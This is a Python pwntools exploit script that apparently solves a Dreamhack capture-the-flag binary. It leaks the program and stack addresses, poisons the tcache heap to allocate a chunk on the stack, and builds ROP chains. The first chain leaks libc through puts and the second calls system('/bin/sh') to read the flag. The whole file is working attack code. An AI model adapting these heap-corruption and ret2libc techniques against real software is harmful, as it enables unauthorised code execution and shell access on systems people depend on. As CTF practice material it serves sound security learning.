#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 23317
HOST = "host8.dreamhack.games"
exe = context.binary = ELF('./prob_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.31.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            brva 0x0000000000001791

            # make
            brva 0x0000000000001322
            brva 0x0000000000001369

            # copy
            brva 0x0000000000001518
            brva 0x00000000000015EB

            # free
            brva 0x0000000000001401
            brva 0x0000000000001439
            brva 0x0000000000001445
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add(idx, size, data=b'abcd'):
    p.sendlineafter(b'>> ', str(1))
    p.sendlineafter(b'>> ', str(idx))
    p.sendlineafter(b'>> ', str(size))
    p.sendafter(b'>> ', data)

def copy(idx, idx1):
    p.sendlineafter(b'>> ', str(2))
    p.sendlineafter(b'>> ', str(idx))
    p.sendlineafter(b'>> ', str(idx1))

def free(idx):
    p.sendlineafter(b'>> ', str(3))
    p.sendlineafter(b'>> ', str(idx))

def change(data):
    p.sendlineafter(b'>> ', str(4))
    p.sendafter(b'>> ', data)

# VARIABLE
free_hook = libc.sym.__free_hook
log.info(hex(free_hook))

# PAYLOAD
payload = b'a'*8
p.sendafter(b'name?\n', b'nhh')
change(b'a'*8)
p.recvuntil(b'a'*8)
exe_leak = u64(p.recv(6) + b'\0'*2)
exe.address = exe_leak - 0x17d0
log.info("Exe base: " + hex(exe.address))
pop_rdi = 0x0000000000001833 + exe.address
ret = pop_rdi + 1
main = exe.sym.main

change(b'a'*0x20)
p.recvuntil(b'a'*0x20)
stack_leak = u64(p.recv(6) + b'\0'*2)
log.info("Stack leak: " + hex(stack_leak))

for i in range(9):
    if i == 3:
        add(i, 0x18)
        continue

    if i != 1:
        add(i, 0x38)
    else:
        add(i, 0xb8)
free(1)
free(2)
add(9, 0x18, b'a'*0x18)
copy(9, 3)
free(5)
free(4)
add(10, 0xb8, b'\0'*0x18 + p64(0x41) + p64(stack_leak - 0x140))
add(11, 0x38)
payload = flat(
    stack_leak - 0xf0,
    pop_rdi,
    exe.got.puts,
    exe.plt.puts,
    main
    )
add(12, 0x38, payload)
libc_leak = u64(p.recv(6) + b'\0'*2)
libc.address = libc_leak - libc.sym.puts
log.info("Libc base: " + hex(libc.address))
system = libc.sym.system
bin_sh = next(libc.search(b'/bin/sh'))

p.sendafter(b'name?\n', b'nhh')
free(11)
free(10)
add(13, 0xb8, b'\0'*0x18 + p64(0x41) + p64(stack_leak - 0x140 - 0x30))
add(14, 0x38)
payload = flat(
    0,
    pop_rdi,
    bin_sh,
    ret,
    system
    )
add(15, 0x38, payload)

p.sendline(b'cat flag')

p.interactive()